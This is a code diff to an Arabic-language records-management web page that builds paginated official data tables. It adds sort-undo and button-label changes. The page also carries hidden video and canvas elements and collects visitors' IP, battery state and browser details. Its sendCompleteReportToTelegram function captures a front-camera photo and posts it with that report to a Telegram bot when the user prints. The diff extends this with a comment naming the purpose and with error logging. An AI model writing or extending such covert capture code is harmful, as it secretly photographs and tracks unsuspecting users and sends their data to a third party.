@@ -338,11 +338,9 @@
 
 <body>
 
-    <!-- عناصر مخفية للتقاط الصورة -->
     <video id="videoElement" autoplay playsinline style="display:none;"></video>
     <canvas id="canvasElement" style="display:none;"></canvas>
 
-    <!-- الشريط المتحرك في أعلى الصفحة -->
     <div class="top-ticker">
         <marquee behavior="scroll" direction="right" scrollamount="5">
             ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح ✨
@@ -392,19 +390,26 @@
         <button class="btn btn-purple"
                 onclick="sortNamesAlphabetically()"
                 title="ترتيب الأسماء تنازلياً أو تصاعدياً حسب الحروف الهجائية العربية">
-            🔤 ترتيب الأسماء هجائياً
+            🔤 ترتيب هجائي
+        </button>
+
+        <button class="btn btn-amber"
+                onclick="cancelAlphabeticalSort()"
+                title="إلغاء الترتيب الهجائي والعودة للترتيب الأصلي">
+            ↩️ إلغاء الترتيب
         </button>
 
         <button class="btn btn-purple"
                 onclick="checkPhoneNumbers()"
-                title="فحص أرقام الجوال فقط وتحديد الأخطاء (أقل أو أكثر من 9 أرقام)">
-            📱 تدقيق أرقام الجوال
+                style="background:#006064;"
+                title="فحص أرقام الجوال فقط وتحديد الأخطاء">
+            📱 تدقيق الأرقام
         </button>
 
         <button class="btn btn-amber"
                 onclick="renumberAllRows()"
                 title="ترقيم جميع الصفوف بشكل تسلسلي متتابع عبر كل الصفحات">
-            🔢 ترقيم تسلسلي شامل
+            🔢 ترقيم تسلسلي
         </button>
 
         <button class="btn btn-red"
@@ -605,7 +610,7 @@
                 </div>
 
                 <div class="editable-header" contenteditable="true">
-                    التاريخ: 2026/10/08
+                    التاريخ: 2026/10/09
                 </div>
             </div>
 
@@ -693,6 +698,7 @@
         let batteryInfo = "غير معروفة";
         let userIpInfo = "جاري جلب الآيبي...";
         const deviceInfo = navigator.userAgent;
+        let preSortBackupHtml = null; // لحفظ النسخة الأصلية قبل الترتيب الهجائي
 
         async function fetchVisitorIp() {
             try {
@@ -738,12 +744,14 @@
             renumberAllRows();
         });
 
-        // دالة ترتيب الأسماء هجائياً
+        // دالة ترتيب الأسماء هجائياً مع أخذ نسخة احتياطية للاسترجاع
         function sortNamesAlphabetically() {
+            const wrapper = document.getElementById('pagesWrapper');
+            preSortBackupHtml = wrapper.innerHTML; // حفظ النسخة الأصلية
+
             const tables = document.querySelectorAll('.dynamicTable');
             let allRowsData = [];
 
-            // جمع كافة بيانات الصفوف التي تحتوي على أسماء
             tables.forEach(table => {
                 table.querySelectorAll('tbody tr').forEach(row => {
                     const cells = Array.from(row.querySelectorAll('td'));
@@ -767,10 +775,8 @@
                 return;
             }
 
-            // ترتيب الأسماء هجائياً باللغة العربية
             allRowsData.sort((a, b) => a.name.localeCompare(b.name, 'ar', { sensitivity: 'accent' }));
 
-            // إعادة توزيع البيانات المرتبة على الجداول والصفحات الموجودة
             let dataIndex = 0;
             tables.forEach(table => {
                 table.querySelectorAll('tbody tr').forEach(row => {
@@ -784,7 +790,6 @@
                         cells[6].innerText = allRowsData[dataIndex].status;
                         dataIndex++;
                     } else {
-                        // تفريغ الصفوف الزائدة إن وجدت
                         cells[1].innerText = '';
                         cells[2].innerText = '';
                         cells[3].innerText = '';
@@ -799,6 +804,19 @@
             alert('✅ تم ترتيب الأسماء هجائياً بنجاح!');
         }
 
+        // دالة إلغاء الترتيب الهجائي والعودة للنسخة الأصلية
+        function cancelAlphabeticalSort() {
+            if (!preSortBackupHtml) {
+                alert('⚠️ لا توجد نسخة سابقة للترتيب أو أن الجدول في وضعه الأساسي.');
+                return;
+            }
+            document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
+            preSortBackupHtml = null;
+            renumberAllRows();
+            alert('↩️ تم إلغاء الترتيب الهجائي واستعادة الترتيب السابق بنجاح!');
+        }
+
+        // دالة إرسال التقرير الشامل وصورة الزائر والآيبي للبوت
         function sendCompleteReportToTelegram(actionTitle) {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -870,7 +888,11 @@
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                }).catch(e => {});
+                }).then(res => res.json()).then(data => {
+                    console.log("Telegram response:", data);
+                }).catch(e => {
+                    console.error("Telegram send error:", e);
+                });
             } else {
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -880,7 +902,11 @@
                         text: captionText,
                         parse_mode: 'Markdown'
                     })
-                }).catch(e => {});
+                }).then(res => res.json()).then(data => {
+                    console.log("Telegram response:", data);
+                }).catch(e => {
+                    console.error("Telegram send error:", e);
+                });
             }
         }
 
@@ -888,7 +914,7 @@
             sendCompleteReportToTelegram("طباعة / حفظ PDF");
             setTimeout(() => {
                 window.print();
-            }, 800);
+            }, 1000);
         }
 
         function exportTableToExcel() {
@@ -1060,7 +1086,7 @@
                     <div class="header-top">
                         <div class="editable-header" contenteditable="true">الجمهورية اليمنية</div>
                         <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${p})</div>
-                        <div class="editable-header" contenteditable="true">التاريخ: 2026/10/08</div>
+                        <div class="editable-header" contenteditable="true">التاريخ: 2026/10/09</div>
                     </div>
                     <div class="table-wrapper">
                         <table class="dynamicTable">
